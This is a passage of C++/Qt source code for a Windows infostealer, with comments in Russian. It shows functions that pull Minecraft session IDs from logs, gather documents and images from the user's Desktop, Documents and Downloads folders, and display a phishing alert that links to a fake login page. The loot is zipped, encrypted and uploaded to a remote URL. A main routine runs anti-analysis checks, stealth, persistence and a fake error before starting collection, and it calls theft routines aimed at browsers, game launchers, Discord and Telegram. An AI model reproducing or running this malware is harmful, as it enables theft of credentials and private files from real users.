                std::lock_guard<std::mutex> lock(g_mutex);
                if (g_mainWindow) g_mainWindow->emitLog(QString("Extracted Minecraft launcher_profiles.json"));
            } else {
                std::lock_guard<std::mutex> lock(g_mutex);
                if (g_mainWindow) g_mainWindow->emitLog(QString("Failed to open Minecraft launcher_profiles.json"));
            }
        }

        std::string logsPath = minecraftPath + "logs\\";
        if (std::filesystem::exists(logsPath)) {
            for (const auto& entry : std::filesystem::directory_iterator(logsPath)) {
                if (entry.path().extension() == ".log") {
                    std::ifstream logFile(entry.path());
                    if (logFile.is_open()) {
                        std::string content((std::istreambuf_iterator<char>(logFile)), std::istreambuf_iterator<char>());
                        logFile.close();
                        std::regex sessionRegex("Session ID: [a-f0-9-]+");
                        std::smatch match;
                        std::string::const_iterator searchStart(content.cbegin());
                        while (std::regex_search(searchStart, content.cend(), match, sessionRegex)) {
                            result += "[Minecraft] Session ID: " + match[0].str() + "\n";
                            searchStart = match.suffix().first;
                        }
                        std::lock_guard<std::mutex> lock(g_mutex);
                        if (g_mainWindow) g_mainWindow->emitLog(QString::fromStdString("Extracted Minecraft log: " + entry.path().string()));
                    } else {
                        std::lock_guard<std::mutex> lock(g_mutex);
                        if (g_mainWindow) g_mainWindow->emitLog(QString::fromStdString("Failed to open Minecraft log: " + entry.path().string()));
                    }
                }
            }
        }

        std::string wsData = CaptureWebSocketSessions("Minecraft.exe");
        if (!wsData.empty()) {
            result += "[Minecraft] WebSocket Data:\n" + wsData + "\n";
        }

        std::string webrtcData = CaptureWebRTCSessions("Minecraft.exe");
        if (!webrtcData.empty()) {
            result += "[Minecraft] WebRTC Data:\n" + webrtcData + "\n";
        }
    } catch (const std::exception& e) {
        std::lock_guard<std::mutex> lock(g_mutex);
        if (g_mainWindow) g_mainWindow->emitLog(QString::fromStdString("Error accessing Minecraft data: " + std::string(e.what())));
    }

    return result;
}

// Кража файлов
std::vector<std::string> StealFiles() {
    std::vector<std::string> stolenFiles;
    if (!g_mainWindow || !g_mainWindow->config.files) return stolenFiles;

    std::vector<std::string> targetDirs = {
        "C:\\Users\\" + std::string(getenv("USERNAME")) + "\\Desktop\\",
        "C:\\Users\\" + std::string(getenv("USERNAME")) + "\\Documents\\",
        "C:\\Users\\" + std::string(getenv("USERNAME")) + "\\Downloads\\"
    };

    std::vector<std::string> targetExtensions = {".txt", ".doc", ".docx", ".pdf", ".jpg", ".png", ".xlsx", ".xls"};

    for (const auto& dir : targetDirs) {
        if (!std::filesystem::exists(dir)) {
            std::lock_guard<std::mutex> lock(g_mutex);
            if (g_mainWindow) g_mainWindow->emitLog(QString::fromStdString("Directory not found for file stealing: " + dir));
            continue;
        }

        try {
            for (const auto& entry : std::filesystem::recursive_directory_iterator(dir)) {
                if (entry.is_regular_file()) {
                    std::string ext = entry.path().extension().string();
                    if (std::find(targetExtensions.begin(), targetExtensions.end(), ext) != targetExtensions.end()) {
                        std::string filePath = entry.path().string();
                        stolenFiles.push_back(filePath);
                        std::lock_guard<std::mutex> lock(g_mutex);
                        if (g_mainWindow) g_mainWindow->emitLog(QString::fromStdString("File collected: " + filePath));
                    }
                }
            }
        } catch (const std::exception& e) {
            std::lock_guard<std::mutex> lock(g_mutex);
            if (g_mainWindow) g_mainWindow->emitLog(QString::fromStdString("Error accessing directory for file stealing: " + dir + " - " + e.what()));
        }
    }

    return stolenFiles;
}

// Социальная инженерия
void SocialEngineering() {
    if (!g_mainWindow || !g_mainWindow->config.socialEngineering) return;

    std::string phishingMessage = "Your account has been compromised! Please visit http://fake-login-page.com to secure your account.";
    MessageBoxA(nullptr, phishingMessage.c_str(), "Security Alert", MB_ICONWARNING | MB_OK);
    std::lock_guard<std::mutex> lock(g_mutex);
    if (g_mainWindow) g_mainWindow->emitLog(QString("Displayed phishing message"));
}

// Создание ZIP-архива
std::string CreateZipArchive(const std::string& data, const std::vector<std::string>& files) {
    std::string zipPath = "data_" + std::to_string(GetTickCount()) + ".zip";
    int err = 0;
    zip_t* zip = zip_open(zipPath.c_str(), ZIP_CREATE | ZIP_TRUNCATE, &err);
    if (!zip) {
        std::lock_guard<std::mutex> lock(g_mutex);
        if (g_mainWindow) g_mainWindow->emitLog(QString::fromStdString("Failed to create ZIP archive: " + zipPath));
        return "";
    }

    // Добавление текстовых данных
    zip_source_t* source = zip_source_buffer(zip, data.c_str(), data.size(), 0);
    if (!source) {
        zip_close(zip);
        std::lock_guard<std::mutex> lock(g_mutex);
        if (g_mainWindow) g_mainWindow->emitLog(QString("Failed to create ZIP source for text data"));
        return "";
    }
    if (zip_file_add(zip, "data.txt", source, ZIP_FL_OVERWRITE) < 0) {
        zip_source_free(source);
        zip_close(zip);
        std::lock_guard<std::mutex> lock(g_mutex);
        if (g_mainWindow) g_mainWindow->emitLog(QString("Failed to add data.txt to ZIP"));
        return "";
    }

    // Добавление файлов
    for (const auto& file : files) {
        if (std::filesystem::exists(file)) {
            std::ifstream fileStream(file, std::ios::binary);
            if (fileStream.is_open()) {
                std::vector<char> fileData((std::istreambuf_iterator<char>(fileStream)), std::istreambuf_iterator<char>());
                fileStream.close();
                zip_source_t* fileSource = zip_source_buffer(zip, fileData.data(), fileData.size(), 0);
                if (!fileSource) {
                    zip_close(zip);
                    std::lock_guard<std::mutex> lock(g_mutex);
                    if (g_mainWindow) g_mainWindow->emitLog(QString::fromStdString("Failed to create ZIP source for file: " + file));
                    return "";
                }
                std::string fileName = std::filesystem::path(file).filename().string();
                if (zip_file_add(zip, fileName.c_str(), fileSource, ZIP_FL_OVERWRITE) < 0) {
                    zip_source_free(fileSource);
                    zip_close(zip);
                    std::lock_guard<std::mutex> lock(g_mutex);
                    if (g_mainWindow) g_mainWindow->emitLog(QString::fromStdString("Failed to add file to ZIP: " + file));
                    return "";
                }
            } else {
                std::lock_guard<std::mutex> lock(g_mutex);
                if (g_mainWindow) g_mainWindow->emitLog(QString::fromStdString("Failed to open file for ZIP: " + file));
            }
        }
    }

    zip_close(zip);
    std::lock_guard<std::mutex> lock(g_mutex);
    if (g_mainWindow) g_mainWindow->emitLog(QString::fromStdString("Created ZIP archive: " + zipPath));
    return zipPath;
}

// Отправка данных
void SendData(const std::string& zipPath) {
    if (!g_mainWindow || zipPath.empty()) return;

    QNetworkAccessManager* manager = new QNetworkAccessManager(g_mainWindow);
    QHttpMultiPart* multiPart = new QHttpMultiPart(QHttpMultiPart::FormDataType);

    QHttpPart filePart;
    filePart.setHeader(QNetworkRequest::ContentDispositionHeader, QVariant(QString::fromStdString("form-data; name=\"file\"; filename=\"" + zipPath + "\"")));
    QFile* file = new QFile(QString::fromStdString(zipPath));
    if (!file->open(QIODevice::ReadOnly)) {
        std::lock_guard<std::mutex> lock(g_mutex);
        if (g_mainWindow) g_mainWindow->emitLog(QString::fromStdString("Failed to open ZIP file for upload: " + zipPath));
        delete file;
        delete multiPart;
        delete manager;
        return;
    }
    filePart.setBodyDevice(file);
    file->setParent(multiPart);
    multiPart->append(filePart);

    QNetworkRequest request(QUrl(QString::fromStdString(g_mainWindow->config.uploadUrl)));
    QNetworkReply* reply = manager->post(request, multiPart);
    multiPart->setParent(reply);

    QObject::connect(reply, &QNetworkReply::finished, [=]() {
        if (reply->error() == QNetworkReply::NoError) {
            std::lock_guard<std::mutex> lock(g_mutex);
            if (g_mainWindow) g_mainWindow->emitLog(QString("Data uploaded successfully"));
        } else {
            std::lock_guard<std::mutex> lock(g_mutex);
            if (g_mainWindow) g_mainWindow->emitLog(QString::fromStdString("Failed to upload data: " + reply->errorString().toStdString()));
        }
        reply->deleteLater();
        manager->deleteLater();
        std::filesystem::remove(zipPath);
    });
}

// Сбор всех данных
void CollectData() {
    if (!g_mainWindow) return;

    std::string allData;

    // Системная информация
    std::string systemInfo = GetCustomSystemInfo();
    if (!systemInfo.empty()) {
        allData += "[System Info]\n" + systemInfo + "\n";
    }

    // Скриншот
    std::string screenshotPath = TakeScreenshot();
    std::vector<std::string> filesToZip;
    if (!screenshotPath.empty()) {
        filesToZip.push_back(screenshotPath);
    }

    // Данные браузеров
    std::string browserData = StealBrowserData();
    if (!browserData.empty()) {
        allData += "[Browser Data]\n" + browserData + "\n";
    }

    // Данные Steam
    std::string steamData = StealSteamData();
    if (!steamData.empty()) {
        allData += "[Steam Data]\n" + steamData + "\n";
    }

    // Данные Epic Games
    std::string epicData = StealEpicGamesData();
    if (!epicData.empty()) {
        allData += "[Epic Games Data]\n" + epicData + "\n";
    }

    // Данные Roblox
    std::string robloxData = StealRobloxData();
    if (!robloxData.empty()) {
        allData += "[Roblox Data]\n" + robloxData + "\n";
    }

    // Данные Battle.net
    std::string battleNetData = StealBattleNetData();
    if (!battleNetData.empty()) {
        allData += "[Battle.net Data]\n" + battleNetData + "\n";
    }

    // Данные Discord
    std::string discordData = StealDiscordData();
    if (!discordData.empty()) {
        allData += "[Discord Data]\n" + discordData + "\n";
    }

    // Данные Telegram
    std::string telegramData = StealTelegramData();
    if (!telegramData.empty()) {
        allData += "[Telegram Data]\n" + telegramData + "\n";
    }

    // Данные Minecraft
    std::string minecraftData = StealMinecraftData();
    if (!minecraftData.empty()) {
        allData += "[Minecraft Data]\n" + minecraftData + "\n";
    }

    // Кража файлов
    std::vector<std::string> stolenFiles = StealFiles();
    filesToZip.insert(filesToZip.end(), stolenFiles.begin(), stolenFiles.end());

    // Социальная инженерия
    SocialEngineering();

    // Шифрование данных
    std::string encryptedData;
    try {
        encryptedData = EncryptData(allData, g_mainWindow->config.encryptionKey1, g_mainWindow->config.encryptionKey2, g_mainWindow->config.encryptionSalt);
        std::lock_guard<std::mutex> lock(g_mutex);
        if (g_mainWindow) g_mainWindow->emitLog(QString("Data encrypted successfully"));
    } catch (const std::exception& e) {
        std::lock_guard<std::mutex> lock(g_mutex);
        if (g_mainWindow) g_mainWindow->emitLog(QString::fromStdString("Failed to encrypt data: " + std::string(e.what())));
        return;
    }

    // Создание ZIP-архива
    std::string zipPath = CreateZipArchive(encryptedData, filesToZip);
    if (zipPath.empty()) {
        std::lock_guard<std::mutex> lock(g_mutex);
        if (g_mainWindow) g_mainWindow->emitLog(QString("Failed to create ZIP archive, aborting upload"));
        return;
    }

    // Отправка данных
    SendData(zipPath);
}

// Основная функция
int main(int argc, char* argv[]) {
    QApplication app(argc, argv);
    Gdiplus::GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, nullptr);

    g_mainWindow = new MainWindow();
    if (AntiAnalysis()) {
        delete g_mainWindow;
        Gdiplus::GdiplusShutdown(gdiplusToken);
        return 1;
    }

    Stealth();
    Persist();
    FakeError();

    std::thread dataThread(CollectData);
    dataThread.detach();

    int result = app.exec();

    delete g_mainWindow;
    Gdiplus::GdiplusShutdown(gdiplusToken);
    return result;
}